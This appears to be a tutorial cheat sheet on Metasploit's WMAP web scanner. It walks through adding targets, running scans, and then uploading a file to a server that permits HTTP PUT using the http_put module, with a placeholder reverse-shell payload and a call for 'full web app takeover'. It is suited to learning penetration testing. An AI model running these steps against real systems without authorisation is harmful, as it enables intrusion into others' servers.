# WMAP â€“ Web Application Scanner in Metasploit

## What Is WMAP?

- **WMAP** = Web Application Mapper (Metasploit plugin)
- Automates web app scanning using **Metasploit auxiliary modules**
- Fully integrated â†’ scan â†’ exploit in one console

---
## Workflow

### 1. **Load Plugin**

```msf
load wmap
```

### 2. **Add Target**

```msf
wmap_sites -a 192.168.1.10        # Adds site (IP or domain)
wmap_targets -t http://192.168.1.10/  # Adds specific URL to scan
```

> â“ **Site vs Target?**  
> 
> - **Site**: The base host (e.g., `192.168.1.10`)  
> - **Target**: A specific **URL path** under that site (e.g., `http://192.168.1.10/`)  
> â†’ You can have multiple targets per site.

### 3. **List Configured Targets**

```msf
wmap_sites -l    # List sites
wmap_targets -l  # List targets
```

### 4. **Preview & Run Scan**

```msf
wmap_run -t   # Shows which aux modules will run (based on detected tech)
wmap_run -e   # Execute full scan
```

â†’ Scans for:

- Directory/file brute-forcing  
- HTTP methods (`GET`, `POST`, `PUT`, etc.)  
- Common vulns (misconfigs, info leaks)

---
## Exploiting Findings: HTTP PUT Example

### Discovery

Scan shows:  
`Allowed methods: GET, HEAD, POST, OPTIONS, PUT`

â†’ **PUT enabled** = potential file upload!

### Test & Exploit

```msf
use auxiliary/scanner/http/http_put
set RHOSTS 192.168.1.10
set PATH /data/          # From dir brute-force (e.g., /data/)
set FILENAME payload.txt
set FILEDATA "Reverse Shell Payload Code"
run
```

âœ… Output: `File uploaded successfully`

### Verify

```bash
curl http://192.168.1.10/data/payload.txt
# Returns PHP code â†’ confirms upload
```

---
## Key Notes

- WMAP **relies on existing MSF aux modules** â€” no magic, just automation.
- **PUT abuse** is common when directory listing + write access exist.
- Always check **allowed HTTP methods** â€” `OPTIONS` reveals them.
- WMAP wonâ€™t exploit â€” it **finds opportunities** you must weaponize.

> ðŸ”¥ Combine WMAP recon + manual exploitation for full web app takeover.

